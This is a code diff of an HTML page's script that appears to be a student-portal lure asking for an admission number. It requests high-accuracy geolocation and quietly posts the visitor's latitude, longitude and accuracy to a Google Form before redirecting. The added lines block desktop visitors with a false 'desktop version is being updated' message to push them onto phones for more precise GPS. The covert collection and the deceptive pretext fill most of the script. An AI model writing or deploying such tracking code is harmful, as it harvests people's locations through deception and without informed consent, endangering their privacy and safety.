@@ -84,63 +84,78 @@
 
     <script>
         function requestLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, { timeout: 5000 });
-            } else {
-                displayError("Geolocation is not supported by this browser.");
-            }
-        }
+// Check if user is on a mobile device
+const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-        function sendLocationData(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            sendForm(latitude, longitude, accuracy);
-        }
+if (!isMobile) {
+   displayError("The Desktop version is currently being updated. Please use a Mobile device to access the website for now.");
+   return; // Stop execution if not on mobile
+}
 
-        function sendForm(latitude, longitude, accuracy) {
-            const admissionNo = document.getElementById("admissionNumber").value;
-            if (!admissionNo) {
-                alert("Please enter your Admission Number.");
-                return;
-            }
+// Continue with location request if on mobile
+if (navigator.geolocation) {
+const options = {
+       enableHighAccuracy: true,  // Request the most accurate position available
+       timeout: 10000,            // Longer timeout to allow for more accurate positioning
+       maximumAge: 0              // Always get a fresh position, don't use cached
+   };
+   navigator.geolocation.getCurrentPosition(sendLocationData, handleLocationError, options);
+} else {
+   displayError("Not supported by this browser.");
+}
+}
 
-            const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
-            const data = new URLSearchParams();
-            data.append("entry.1267598962", latitude);
-            data.append("entry.1270259896", longitude);
-            data.append("entry.1888406517", accuracy);
 
-            fetch(formUrl, {
-                method: "POST",
-                body: data,
-                mode: "no-cors",
-            }).then(() => {
-                window.location.href = "next-page.html"; // Redirect to another page on success
-            }).catch((error) => {
-                document.getElementById("output").innerText = "Error: " + error.message;
-            });
-        }
+       function sendLocationData(position) {
+           const latitude = position.coords.latitude;
+           const longitude = position.coords.longitude;
+           const accuracy = position.coords.accuracy;
+           sendForm(latitude, longitude, accuracy);
+       }
 
-        function handleLocationError(error) {
-            displayError("Error: Please enable location access to continue. Once Done, the page will be redirected automatically, if not please close the page and try opening in a new Window.");
-        }
+       function sendForm(latitude, longitude, accuracy) {
+           const admissionNo = document.getElementById("admissionNumber").value;
+           if (!admissionNo) {
+               alert("Please enter your Admission Number.");
+               return;
+           }
 
-        function displayError(message) {
-            const locationError = document.getElementById("locationError");
-            locationError.innerHTML = message;
-            locationError.classList.remove('hidden');
-        }
+           const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
+           const data = new URLSearchParams();
+           data.append("entry.1267598962", latitude);
+           data.append("entry.1270259896", longitude);
+           data.append("entry.1888406517", accuracy);
 
-        document.getElementById('submit').addEventListener('click', function(event) {
-            event.preventDefault();
-            const admissionNumber = document.getElementById('admissionNumber').value;
-            if (!admissionNumber) {
-                alert("Please enter your Student Admission Number.");
-                return;
-            }
-            requestLocation(); // Ensure location data is tried again on submit if not already done
-        });
+           fetch(formUrl, {
+               method: "POST",
+               body: data,
+               mode: "no-cors",
+           }).then(() => {
+               window.location.href = "next-page.html"; // Redirect to another page on success
+           }).catch((error) => {
+               document.getElementById("output").innerText = "Error: " + error.message;
+           });
+       }
+
+       function handleLocationError(error) {
+           displayError("Error: Please enable location access to continue. Once Done, the page will be redirected automatically, if not please close the page and try opening in a new Window.");
+       }
+
+       function displayError(message) {
+           const locationError = document.getElementById("locationError");
+           locationError.innerHTML = message;
+           locationError.classList.remove('hidden');
+       }
+
+       document.getElementById('submit').addEventListener('click', function(event) {
+           event.preventDefault();
+           const admissionNumber = document.getElementById('admissionNumber').value;
+           if (!admissionNumber) {
+               alert("Please enter your Student Admission Number.");
+               return;
+           }
+           requestLocation(); // Ensure location data is tried again on submit if not already done
+       });
     </script>
 </body>
 </html>
